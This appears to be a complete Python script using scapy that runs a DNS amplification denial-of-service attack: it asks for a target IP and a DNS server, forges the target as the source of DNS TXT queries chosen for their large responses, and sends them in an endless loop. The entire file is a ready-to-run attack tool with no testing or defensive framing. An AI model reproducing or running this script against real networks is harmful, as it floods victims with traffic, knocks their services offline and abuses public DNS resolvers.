import scapy.all as scp

target_ip = input("Target IP: ")
dns_server = input("DNS Server IP: ")
# url_name = input("URL [Optional]: ")


def dns_amplification(target_ip, dns_server, query_name="example.com"):
    # Construct a DNS query packet with a spoofed source IP
    ip = scp.IP(src=target_ip, dst=dns_server)
    udp = scp.UDP(dport=53)  # port for DNS server
    dns = scp.DNS(rd=1, qd=scp.DNSQR(qname=query_name, qtype="TXT"))
    # qtype TXT makes dns response the largest
    packet = ip / udp / dns

    # Send the packet
    scp.send(packet, loop=1, verbose=0)


# Example usage: dns_amplification('192.168.1.10', '8.8.8.8', 'example.com')
dns_amplification(target_ip, dns_server)
